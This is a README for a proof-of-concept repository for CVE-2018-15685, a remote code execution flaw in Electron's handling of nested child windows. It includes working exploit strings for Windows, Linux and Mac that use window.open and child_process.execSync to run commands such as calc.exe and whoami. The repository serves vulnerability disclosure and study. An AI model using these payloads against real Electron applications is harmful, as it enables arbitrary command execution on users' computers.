# CVE-2018-15685 - Electron WebPreferences Remote Code Execution

![enter image description here](https://cdn-images-1.medium.com/max/2000/1*aBsgPiEeOE5lLoippRm7BA.png)
This is a minimal Electron application with a POC for [CVE-2018-15685](https://nvd.nist.gov/vuln/detail/CVE-2018-15685).

> A remote code execution vulnerability has been discovered affecting apps with the ability to open nested child windows on Electron versions (3.0.0-beta.6, 2.0.7, 1.8.7, and 1.7.15). This vulnerability has been assigned the CVE identifier CVE-2018-15685.


The project contains the fillowing files:

- `main.js` - This is the app's **main process**. Note this has `nodeIntegration` disabled so it should not be possibe use "process"
- `index.html` - This is an example rendered page. This could be remotely controlled URL, or a page from an application with an XSS. In this example even though it is a local file but should not have access to node bindings.

## To Use

To clone and run this repository you'll need [Git](https://git-scm.com) and [Node.js](https://nodejs.org/en/download/) (which comes with [npm](http://npmjs.com)) installed on your computer. From your command line:

```bash
# Clone this repository
git clone https://github.com/rahulr311295/Electron_RCE.git
# Go into the repository
cd Electron_RCE
# Start a PHP Server
sudo php -S localhost:80
# Install dependencies
npm install
# Run the app
npm start
```
## To Run

### Windows
```
# Exploit Code
window.open().open('data:text/html,Code Execution <br><pre>Exploited: <pre><script>document.write(require("child_process").execSync("calc.exe"))</scr'+'ipt></pre></br></br><pre>Whoami: <pre><script>document.write(require("child_process").execSync("whoami"))</scr'+'ipt></pre></pre>');

# Which Executes Calculator and shows which user is currently logged in
```
![Windows](https://media.giphy.com/media/7OWdOErn5tFn2F1LKW/giphy.gif)
    
### Linux
```
# Exploit Code
window.open().open('data:text/html,Code Execution <br><pre>Exploited: <pre><script>document.write(require("child_process").execSync("ls"))</scr'+'ipt></pre></br></br><pre>Whoami: <pre><script>document.write(require("child_process").execSync("whoami"))</scr'+'ipt></pre></pre>');

# Which lists files and shows which user is currently logged in
```
![Linux](https://media.giphy.com/media/4ZcOpedgQBPMMWdHsN/giphy.gif)

### Mac
```
# Exploit Code
window.open().open('data:text/html,Code Execution <br><pre>Exploited: <pre><script>document.write(require("child_process").execSync("ls"))</scr'+'ipt></pre></br></br><pre>Whoami: <pre><script>document.write(require("child_process").execSync("open /Applications/Calculator.app"))</scr'+'ipt></pre></pre>');

# Which Executes Calculator and lists files in the directory
```
![Linux](https://media.giphy.com/media/XIhhk0xiXlkK1Roqux/giphy.gif)

**For More Information about this Vulnerability **

Full write up on the [Contrast Security blog](https://www.contrastsecurity.com/security-influencers/cve-2018-15685) or the write up on the offical blog from [Electron](https://electronjs.org/blog/web-preferences-fix)

**Credits to**
#### [Matt Austin](https://github.com/matt-) for the original POC